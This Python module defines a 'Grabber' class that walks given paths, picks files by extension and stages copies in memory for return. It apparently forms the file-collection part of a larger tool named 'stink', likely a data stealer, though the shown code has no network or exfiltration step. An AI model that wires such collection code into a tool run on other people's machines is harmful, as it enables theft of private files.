from typing import List
from os import path, walk, listdir

from stink.helpers import MemoryStorage


class Grabber:
    """
    Collects the specified files from the specified paths.
    """

    def __init__(
        self, paths: List[str], file_types: List[str], check_sub_folders: bool = False
    ):
        self.__paths = paths
        self.__file_types = file_types
        self.__check_sub_folders = check_sub_folders

        self.__storage = MemoryStorage()
        self.__folder = "Grabber"

    def __grab_files(self) -> None:
        """
        Collects the specified files from the specified paths.

        Parameters:
        - None.

        Returns:
        - None.
        """
        for item in self.__paths:
            if path.isfile(item):
                if not any(item.endswith(file_type) for file_type in self.__file_types):
                    continue

                self.__storage.add_from_disk(item, path.join(self.__folder, item))

            elif path.isdir(item):
                if self.__check_sub_folders:
                    for folder_name, _, filenames in walk(item):
                        for filename in filenames:
                            if not any(
                                filename.endswith(file_type)
                                for file_type in self.__file_types
                            ):
                                continue

                            self.__storage.add_from_disk(
                                path.join(folder_name, filename),
                                path.join(self.__folder, filename),
                            )
                else:
                    for filename in listdir(item):
                        if not any(
                            filename.endswith(file_type)
                            for file_type in self.__file_types
                        ):
                            continue

                        self.__storage.add_from_disk(
                            path.join(item, filename),
                            path.join(self.__folder, filename),
                        )

    def run(self) -> List:
        """
        Launches the grabber module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:
            self.__grab_files()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Grabber]: {repr(e)}")
